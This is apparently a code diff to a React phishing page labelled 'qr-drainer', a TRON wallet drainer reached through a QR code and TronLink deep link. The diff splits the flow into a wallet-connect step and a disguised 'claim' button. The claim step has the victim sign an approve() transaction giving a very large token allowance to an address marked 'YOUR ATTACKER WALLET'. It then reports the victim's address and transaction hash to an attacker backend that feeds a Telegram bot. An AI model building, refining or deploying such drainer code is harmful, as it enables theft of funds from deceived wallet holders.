@@ -3,7 +3,7 @@ import { QRCodeSVG } from "qrcode.react";
 
 // CONFIGURATION
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
-const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET (Account 01)
+const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET
 const BACKEND = "https://qr-drainer.onrender.com";
 const VERCEL_URL = "https://qr-drainer-one.vercel.app";
 
@@ -18,43 +18,119 @@ export default function App() {
   const [victimBal, setVictimBal] = useState(0);
   const [copied, setCopied] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [inTronLink, setInTronLink] = useState(false);
+  const [connectionStatus, setConnectionStatus] = useState("disconnected"); // disconnected, connecting, connected
 
   // QR Code with TronLink deep link
   const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
 
-  useEffect(() => {
-    // Check if we're inside TronLink
-    if (window.tronWeb && window.tronWeb.defaultAddress) {
-      setInTronLink(true);
-      const addr = window.tronWeb.defaultAddress.base58;
-      setWallet(addr);
-      
-      // Read balance
-      window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
-        return c.balanceOf(addr).call();
-      }).then(raw => {
-        setVictimBal(Number(raw.toString()) / 1e6);
-      }).catch(e => console.log("Balance read error", e));
+  // Helper to read balance
+  const readBalance = async (addr) => {
+    try {
+      const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+      const raw = await c.balanceOf(addr).call();
+      setVictimBal(Number(raw.toString()) / 1e6);
+    } catch (e) {
+      console.log("Balance read error", e);
     }
+  };
 
-    // Heartbeat
-    const checkWallet = setInterval(() => {
-      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-        const addr = window.tronWeb.defaultAddress.base58;
-        if (wallet !== addr) {
-          setWallet(addr);
-          setInTronLink(true);
-          window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
-            return c.balanceOf(addr).call();
-          }).then(raw => {
-            setVictimBal(Number(raw.toString()) / 1e6);
-          }).catch(e => console.log("Balance read error", e));
-        }
+  // STEP 1: THE CONNECTION (Triggers Image 4 Popup)
+  const handleConnect = async () => {
+    setConnectionStatus("connecting");
+    try {
+      // This triggers the "Wants to connect to your wallet" popup
+      if (window.tronLink && window.tronLink.request) {
+        await window.tronLink.request({ method: "tron_requestAccounts" });
+      } else if (window.tronWeb) {
+        // Fallback for wallets that inject tronWeb but need explicit request
+        await window.tronWeb.request({ method: "tron_requestAccounts" });
+      } else {
+        throw new Error("No wallet detected. Please use TronLink or Trust Wallet.");
       }
-    }, 2000);
-    return () => clearInterval(checkWallet);
-  }, [wallet]);
+
+      // Wait a moment for the wallet to inject the address
+      setTimeout(() => {
+        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+          const addr = window.tronWeb.defaultAddress.base58;
+          setWallet(addr);
+          setConnectionStatus("connected");
+          readBalance(addr);
+        } else {
+          alert("Connection failed. Please ensure you are in the DApp browser.");
+          setConnectionStatus("disconnected");
+        }
+      }, 1500);
+
+    } catch (e) {
+      console.error(e);
+      alert("Connection rejected or failed.");
+      setConnectionStatus("disconnected");
+    }
+  };
+
+  // STEP 2: THE APPROVAL (Triggers Image 5 Popup)
+  const handleClaim = async () => {
+    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+      alert("Please connect your wallet first.");
+      return;
+    }
+    
+    setLoading(true);
+    try {
+      const tronWeb = window.tronWeb;
+      const userAddress = tronWeb.defaultAddress.base58;
+
+      // Build the approve transaction manually to show the raw data popup (Image 5)
+      const functionSelector = "approve(address,uint256)";
+      const parameter = [
+        { type: 'address', value: SWEEPER_ADDRESS },
+        { type: 'uint256', value: 1000000000000000 } // Large amount
+      ];
+      const options = { feeLimit: 100000000, callValue: 0 };
+
+      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+        TOKEN_ADDRESS,
+        functionSelector,
+        options,
+        parameter,
+        userAddress
+      );
+
+      if (!transaction.result || !transaction.result.result) {
+        throw new Error("Contract call rejected by network");
+      }
+
+      // Sign the transaction (This triggers the "Confirm" popup with raw data)
+      const signedTx = await tronWeb.trx.sign(transaction.transaction);
+      
+      // Broadcast to blockchain
+      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+      
+      if (broadcast.result) {
+        const txId = broadcast.txid || transaction.transaction.txID;
+        
+        // Alert Backend
+        await fetch(`${BACKEND}/api/alert`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            victimAddress: userAddress, 
+            txHash: txId, 
+            network: "TRON Shasta" 
+          })
+        });
+        
+        alert("✅ Success! Check your Telegram bot.");
+      } else {
+        throw new Error("Broadcast failed");
+      }
+
+    } catch (e) {
+      console.error(e);
+      alert("❌ Error: " + e.message);
+    }
+    setLoading(false);
+  };
 
   const handleOpenInTronLink = () => {
     window.location.href = `tronlink://open?url=${encodeURIComponent(window.location.href)}`;
@@ -96,77 +172,6 @@ export default function App() {
       logoImg.src = TRON_LOGO_B64;
     };
     img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
-  };
-
-  // BULLETPROOF CLAIM FUNCTION (Fixes "Invalid Address" and triggers native popup)
-  const handleClaim = async () => {
-    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-      alert("Please connect your wallet first.");
-      return;
-    }
-    
-    setLoading(true);
-    try {
-      const tronWeb = window.tronWeb;
-      const userAddress = tronWeb.defaultAddress.base58;
-
-      // 1. FORCE TRONLINK EXTENSION TO AUTHORIZE THE SITE (Fixes "Invalid address")
-      if (window.tronLink && window.tronLink.request) {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-      }
-
-      // 2. BUILD TRANSACTION MANUALLY (Triggers the best native popup)
-      // Function: approve(address spender, uint256 amount)
-      const functionSelector = "approve(address,uint256)";
-      const parameter = [
-        { type: 'address', value: SWEEPER_ADDRESS },
-        { type: 'uint256', value: 1000000000000000 } // Large amount
-      ];
-      const options = { feeLimit: 100000000, callValue: 0 };
-
-      // This builds the raw transaction object
-      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-        TOKEN_ADDRESS,
-        functionSelector,
-        options,
-        parameter,
-        userAddress
-      );
-
-      if (!transaction.result || !transaction.result.result) {
-        throw new Error("Contract call rejected by network");
-      }
-
-      // 3. SIGN THE TRANSACTION (THIS TRIGGERS THE NATIVE TRONLINK POPUP)
-      const signedTx = await tronWeb.trx.sign(transaction.transaction);
-      
-      // 4. BROADCAST TO BLOCKCHAIN
-      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-      
-      if (broadcast.result) {
-        const txId = broadcast.txid || transaction.transaction.txID;
-        
-        // 5. ALERT BACKEND
-        await fetch(`${BACKEND}/api/alert`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            victimAddress: userAddress, 
-            txHash: txId, 
-            network: "TRON Shasta" 
-          })
-        });
-        
-        alert("✅ Success! Check your Telegram bot.");
-      } else {
-        throw new Error("Broadcast failed");
-      }
-
-    } catch (e) {
-      console.error(e);
-      alert("❌ Error: " + e.message);
-    }
-    setLoading(false);
   };
 
   return (
@@ -309,13 +314,13 @@ export default function App() {
           </button>
         </div>
 
-        {/* DYNAMIC BUTTON */}
-        {!inTronLink ? (
+        {/* DYNAMIC BUTTONS: Connect -> Claim */}
+        {connectionStatus === "disconnected" ? (
           <button 
-            onClick={handleOpenInTronLink}
+            onClick={handleConnect}
             style={{ 
               width: '100%', 
-              background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', 
+              background: 'linear-gradient(135deg, #00d2ff, #3a7bd5)', 
               color: '#fff', 
               border: 'none', 
               borderRadius: '12px', 
@@ -323,13 +328,14 @@ export default function App() {
               fontSize: '16px', 
               fontWeight: '700', 
               cursor: 'pointer',
-              boxShadow: '0 4px 20px rgba(255,45,85,0.4)'
+              boxShadow: '0 4px 20px rgba(0,210,255,0.3)'
             }}
           >
-            🔗 Open in TronLink
+            🔗 Connect Wallet
           </button>
-        ) : !wallet ? (
+        ) : connectionStatus === "connecting" ? (
           <button 
+            disabled
             style={{ 
               width: '100%', 
               background: '#2a2d3a', 
@@ -339,10 +345,8 @@ export default function App() {
               padding: '16px', 
               fontSize: '16px', 
               fontWeight: '700', 
-              cursor: 'not-allowed',
-              opacity: 0.6
+              cursor: 'not-allowed'
             }}
-            disabled
           >
             Connecting...
           </button>
